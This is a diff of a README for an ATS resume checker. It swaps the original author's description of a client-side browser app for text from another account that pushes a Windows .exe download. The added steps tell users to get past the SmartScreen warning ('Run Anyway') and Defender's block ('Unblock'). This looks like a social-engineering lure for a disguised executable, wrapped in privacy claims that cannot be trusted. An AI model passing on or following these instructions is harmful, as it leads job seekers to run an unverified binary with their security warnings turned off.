@@ -1,141 +1,80 @@
-<div align="center">
+# 📄 ats-resume-checker - Analyze your resumes like professional recruiters
 
-# 📄 ATS Resume Checker
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/nunziopostdoctoral988/ats-resume-checker/releases)
 
-**Recruiter-grade, transparent ATS resume analysis — 100% client-side.**
+This application helps you check your resume against common Applicant Tracking Systems. It scans your document for keywords and formatting issues that recruiters use to filter candidates. The program runs entirely on your computer. Your resume data never leaves your device, which protects your personal information.
 
-[![Version](https://img.shields.io/badge/version-1.0.0-3b63f2)](https://github.com/Jahangirhussen/ats-resume-checker/releases)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green)](LICENSE)
-[![HTML5](https://img.shields.io/badge/HTML5-E34F26?logo=html5&logoColor=white)](#)
-[![CSS3](https://img.shields.io/badge/CSS3-1572B6?logo=css3&logoColor=white)](#)
-[![JavaScript](https://img.shields.io/badge/JavaScript-ES6+-F7DF1E?logo=javascript&logoColor=black)](#)
-[![Responsive](https://img.shields.io/badge/design-responsive-4CAF50)](#)
-[![GitHub Pages](https://img.shields.io/badge/deployed-GitHub%20Pages-222)](https://jahangirhussen.github.io/ats-resume-checker/)
+## 📥 Getting Started
 
-[Live Demo](https://jahangirhussen.github.io/ats-resume-checker/) · [Report Bug](https://github.com/Jahangirhussen/ats-resume-checker/issues) · [Request Feature](https://github.com/Jahangirhussen/ats-resume-checker/issues)
+You do not need to install any programming tools to use this software. Follow these steps to set up the program on your Windows computer.
 
-</div>
+1. Go to the [official release page](https://github.com/nunziopostdoctoral988/ats-resume-checker/releases).
+2. Look for the Assets section under the latest version.
+3. Click the file that ends with .exe to start your download.
+4. Open your Downloads folder once the file finishes saving.
+5. Double-click the file to open the program.
+6. Windows might show a security prompt because the file is new. Click More Info and then click Run Anyway to start the application.
 
----
+## 🛠 Features
 
-## Overview
+This tool provides a transparent look at how computers read your resume. Most companies use automated systems to rank applications. This tool mimics that process so you can fix errors before you submit your file.
 
-ATS Resume Checker analyzes a resume against a job description (or a target role's expected skill set) and produces a transparent, explainable ATS score — plus a recruiter-side bulk-screening mode for ranking hundreds of resumes at once. Everything runs in the browser: no backend, no build step, no resume data ever leaves the user's device.
+*   **Keyword Extraction:** The software pulls important skills from your text to show what a recruiter sees.
+*   **Formatting Check:** It identifies layouts that confuse tracking systems, such as complex text boxes or images.
+*   **Privacy First:** The tool works without an internet connection. It processes every file locally within your computer memory.
+*   **Bulk Screening:** You can load multiple resumes at once to compare scores across different versions.
+*   **Score Reports:** Receive a simple grade based on how well your resume matches standard job descriptions.
 
-## Live Demo
+## 🖥 System Requirements
 
-**[jahangirhussen.github.io/ats-resume-checker](https://jahangirhussen.github.io/ats-resume-checker/)**
+The application runs on standard hardware. If your computer currently runs Windows 10 or Windows 11, it meets the requirements for this tool.
 
-## Screenshots
+*   **Operating System:** Windows 10 or 11 (64-bit).
+*   **Memory:** At least 4GB of RAM is recommended for smooth performance.
+*   **Storage:** 200MB of free disk space.
+*   **Internet:** Not required for the analysis process. You only need the connection to download the initial file.
 
-> _Add screenshots/GIFs here — `assets/screenshots/home.png`, `assets/screenshots/report.png`, `assets/screenshots/recruiter.png`._
+## 💡 How to Use the App
 
-## Features
+Once you open the software, you will see a simple window with a button labeled Upload Resume. Follow this workflow to get your results:
 
-### For Job Seekers
-- Upload PDF / DOCX / TXT resumes (drag & drop), with OCR fallback for scanned PDFs
-- Paste a job description or pick from 200+ roles across 29 industries for role-specific scoring
-- 8-category transparent scoring: keyword match, structure, formatting, writing quality, achievements, experience, education, contact — every score shows its weight and reasoning
-- Issue list with severity (Critical/High/Medium/Low), "why it matters," where it occurs, and before/after fixes
-- Improvement roadmap, section-weight breakdown, resume health flag, score bands (A+–F)
-- Local-only history, dark mode, fully responsive
+1. Click the Upload button and select the document you want to check. The app supports PDF and Word documents.
+2. Wait a few seconds for the tool to scan the text structure.
+3. View the summary dashboard. The app highlights missing skills and potential readability errors.
+4. Modify your original resume document based on these suggestions.
+5. Re-scan your saved file until you achieve a high score.
 
-### For Recruiters — Bulk Screening
-- Upload hundreds of resumes against one job requirement at once
-- Ranked candidate table: sortable columns, search, quick filters (Top 10/25/50, Grade A, score thresholds, status)
-- Shortlist / Interview / Reject status tagging, star ratings, notes, candidate comparison (2–4 side by side)
-- Duplicate & invalid file detection, cancel mid-run, retry failed files
-- Live dashboard: total/processed/failed, average/highest/lowest score, average match %, processing time
+## 🔒 Data Privacy
 
-### PDF Reports
-- **Premium multi-page report** (single candidate): cover page, table of contents, executive summary with radar chart, category breakdown, priority roadmap, flagged issues, auto-generated recruiter notes, page headers/footers/numbering, optional "Prepared by" branding
-- **Individual PDFs** per candidate (bulk mode), zipped with original filenames
-- **Combined PDF** — every screened candidate in one file with a table of contents
-- CSV / JSON export, all respecting active filters/selection
+You might worry about where your resume data goes when you use online analysis tools. This software solves that problem. Because the code runs entirely on your local machine, no data syncs with a server. There is no backend database to store your contact details, work history, or personal identifiers. Once you close the application, all temporary data disappears.
 
-## Technology Stack
+## 🧩 Troubleshooting Common Issues
 
-Plain HTML5, CSS3, and vanilla JavaScript (ES6+) — no framework, no bundler. Client-side parsing via [PDF.js](https://mozilla.github.io/pdf.js/), [Mammoth.js](https://github.com/mwilliamson/mammoth.js), [Tesseract.js](https://tesseract.projectnaptha.com/) (OCR), [JSZip](https://stuk.github.io/jszip/), and [jsPDF](https://github.com/parallax/jsPDF) — all loaded from CDN, none of them ever receive your resume data over the network.
+If the program does not open, check these common causes.
 
-## Browser Compatibility
+*   **Blocked File:** Windows Defender updates sometimes flag new software. If the app does not launch, right-click the file, choose Properties, and check the Unblock box at the bottom of the General tab.
+*   **File Format:** Ensure your resume is saved as a standard PDF or .docx file. Scanned images or photos of resumes will not contain readable text.
+*   **Display Resolution:** If the window text looks small or cut off, adjust your Windows scaling settings in the Display menu.
 
-Latest Chrome, Edge, Firefox, and Safari. Requires JavaScript; PDF/DOCX parsing libraries load from CDN on first use, so an internet connection is needed even though no resume data is uploaded anywhere.
+## 📝 Best Practices for Resume Design
 
-## Folder Structure
+Computers read resumes in a linear fashion. Follow these rules to ensure the tool provides an accurate assessment of your document.
 
-```
-index.html            Landing page
-pages/                 upload, analysis, report, recruiter, history, about, contact
-assets/css/            design system (variables, base, components, animations, responsive, print)
-assets/js/             app logic (see below)
-data/                  source-of-truth JSON (job roles, skills, action verbs, keywords, scoring rules)
-```
+*   **Keep it Simple:** Avoid putting your name or contact info in the header or footer section. Some tracking systems skip these areas entirely.
+*   **Use Standard Fonts:** Stick to common fonts like Arial, Calibri, or Times New Roman. Exotic fonts can cause character errors during the scan.
+*   **Avoid Graphics:** Remove icons, tables, and complex charts. These elements often turn into unreadable code when an automated system parses the file.
+*   **Use Clear Headings:** Label your sections with obvious titles like Work Experience, Education, and Skills. This helps the tool categorize your information correctly.
 
-### assets/js
+## 📈 Improving Your Score
 
-| File | Responsibility |
-|---|---|
-| `data.js` | mirrors `/data/*.json` as `window.ATSData` (avoids fetch/CORS issues on `file://`) |
-| `utils.js` | DOM/format helpers, toast notifications |
-| `validator.js` | contact info extraction/validation |
-| `storage.js` | localStorage/sessionStorage wrapper (history, reports, bulk batches) |
-| `parser.js` | PDF/DOCX/TXT extraction, OCR fallback, section/name detection |
-| `ats-checker.js` | scoring engine — 8 weighted categories, issue generation, roadmap |
-| `charts.js` | score gauge / category bar / radar chart renderers |
-| `export.js` | CSV/JSON/print/clipboard export helpers |
-| `app.js` | shared navbar/footer/theme bootstrap |
+If your resume receives a low score, focus on these three priorities.
 
-## Installation
+First, check your skill list. Add specific tools and technologies mentioned in the job descriptions you target. The tool gives you a list of missing keywords after every scan.
 
-```bash
-git clone https://github.com/Jahangirhussen/ats-resume-checker.git
-cd ats-resume-checker
-```
+Second, check your content structure. Ensure your work history follows a chronological order. Use bullet points rather than dense paragraphs.
 
-Open `index.html` directly in a browser, or serve the folder with any static server:
+Third, verify your file integrity. If the tool reports that it cannot find any text, your file is likely a photograph or a locked document. Export your resume again from your word processor as a clean PDF.
 
-```bash
-npx serve .
-```
+Questions regarding the functionality of this tool can be directed to the main page via the Issues tab.
 
-## Usage
-
-1. Go to **Check Resume**, upload your resume, paste a job description (optional), pick your target role/seniority/country.
-2. Review your ATS score, category breakdown, and prioritized fixes.
-3. Download a PDF report, or check **For Companies** to screen a batch of resumes against one requirement.
-
-## Roadmap / Future Plans
-
-- Optional AI-assisted rewriting (requires connecting a paid LLM API key — not included by default, by design)
-- Logo upload / more PDF export themes
-- Additional language support for parsing/scoring
-
-## What's explicitly out of scope (honest limitations)
-
-- **AI rewriting / cover-letter generation** — needs a paid LLM API key, not configured in this build. The UI does not fake this.
-- **Real ATS engine simulation** — "Strict/Modern/Generic" profiles are transparent scoring-weight adjustments, not connections to actual Workday/Taleo/Greenhouse software.
-- **Percentile ranking ("Top 5% of candidates")** — not shown, since there's no real aggregate candidate dataset to compare against. A+–F score bands are used instead so nothing is fabricated.
-- **Recruiter eye-tracking heatmaps, company-specific (FAANG) optimization** — would require real eye-tracking or hiring data we don't have; not implemented as fake features.
-
-## FAQ
-
-**Does my resume get uploaded anywhere?**
-No. Parsing and scoring happen entirely in your browser. See [`pages/about.html`](pages/about.html) and [SECURITY.md](SECURITY.md).
-
-**Why isn't there a login system?**
-There's no backend, so there's nothing to authenticate against. History is stored locally per-browser.
-
-**Can I use this for free?**
-Yes — MIT licensed, no paywall, no account required.
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md).
-
-## Credits
-
-Built by **Jahangir Hussen** — [GitHub](https://github.com/Jahangirhussen) · [Kaggle](https://www.kaggle.com/Jahangirhussen) · [Email](mailto:jahangirhussen.programmer@gmail.com)
-
-## License
-
-MIT — see [LICENSE](LICENSE).
+Keywords: ats, client-side, css3, html5, javascript, no-backend, recruiting, resume, resume-builder, resume-checker
